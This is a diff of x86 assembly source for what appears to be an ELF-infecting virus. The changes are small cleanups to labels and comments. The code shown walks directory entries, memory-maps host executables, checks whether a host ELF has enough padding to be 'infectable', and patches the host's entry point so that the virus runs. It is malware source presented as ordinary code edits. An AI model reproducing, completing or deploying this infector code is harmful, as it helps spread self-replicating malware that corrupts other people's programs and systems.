@@ -79,7 +79,7 @@ openfile:
     cmpb $0, %al
     jl dirents
 
-before_mmap:
+    # mmap host
     call mmap
     # save fd for close
     mov %ebx, 12(%esp)
@@ -100,6 +100,7 @@ vstart_addr:
     sub $5, %edi
     mov %edi, 24(%esp)
     jmp _vend
+
 vend_addr:
     pop %esi
     mov %esi, 28(%esp)
@@ -107,11 +108,9 @@ vend_addr:
     mov %esi, 32(%esp)
     sub %edi, 32(%esp)
 
-    # is host an elf exe 
-    # with enough padding
+    # check host is an elf exe with enough padding
     mov 32(%esp), %edi
     call isinfectable
-after_infectable:
     # padding offset
     cmp $0, %ebx
     je unmap
@@ -211,7 +210,6 @@ mmap:
     cmp $0, %eax
     jl mmap_fail
 
-do_mmap:
     # mmap host 
     mov $192, %eax
     # fd
@@ -419,6 +417,7 @@ patch_host_ep:
     mov 12(%esp), %eax
     call find_tphdr
     cmp $0, %ebx
+
 end_tphdr:
     je end_infect
     mov 8(%esp), %edx
